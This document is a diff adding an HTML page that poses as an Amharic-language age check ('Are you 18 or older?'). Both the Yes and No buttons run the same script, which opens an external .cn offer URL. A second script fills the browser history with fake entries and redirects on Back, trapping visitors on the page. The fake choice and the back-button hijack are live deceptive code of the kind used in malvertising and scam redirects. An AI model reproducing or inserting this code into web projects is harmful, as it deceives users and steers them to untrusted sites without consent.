@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<title>Are you 18?</title>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<style>
+			html {
+				background: #000;
+			}
+
+			.Jumbotron {
+				width: 100%;
+				margin-top: 40vw;
+				text-align: center;
+				font-family: Tahoma, Geneva, sans-serif;
+				font-size: 9vw;
+				color: #fff;
+				width: 100%;
+
+			}
+
+			.bholder {
+				margin-top: 30vw;
+				margin-left: 1vw;
+				width: 100%;
+				font-family: Tahoma, Geneva, sans-serif;
+
+			}
+
+			.yes {
+				margin-left: 1vw;
+				margin-right: 5vw;
+				padding-top: 3vw;
+				padding-bottom: 3vw;
+				padding-left: 12vw;
+				padding-right: 12vw;
+				border: 1px solid #fff;
+				background: #000;
+				font-size: 8vw;
+				color: #fff;
+			}
+
+			.no {
+				margin-left: 1vw;
+				margin-right: 1vw;
+				padding-top: 3vw;
+				padding-bottom: 3vw;
+				padding-left: 15vw;
+				padding-right: 15vw;
+				border: 1px solid #fff;
+				background: #000;
+				font-size: 8vw;
+				color: #fff;
+			}
+
+			#buttons:hover {
+				background: #00CF2D;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="Jumbotron">
+			18 ወይም ከዚያ በላይ ነዎት?
+		</div>
+		<div class="bholder">
+			<a><button type="button" class="yes but popu" id="buttons">አዎ</button></a>
+			<a><button type="button" class="no but popu" id="buttons">አይ</button></a>
+		</div>
+		
+		<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+		<script>
+			function toOffer() {
+				window.open("https://desirehoom.cn/ce0pl1k.php?lp=1")
+				
+				setTimeout(() => {
+					location.href = ""
+				}, 200);
+			}
+			
+			$(function() {
+				$('button').click(function() {
+					toOffer()
+				})
+			})
+		</script>
+		<script type="text/javascript">
+		    !function () {
+		        const bbrLink = "";; 
+		        var t;
+		        try {
+		            for (t = 0; 10 > t; ++t)history.pushState({}, "", "#");
+		            onpopstate = function (t) { t.state && location.replace(bbrLink) }
+		        } catch (o) { }
+		    }();
+		</script>
+	</body>
+	
+</html>
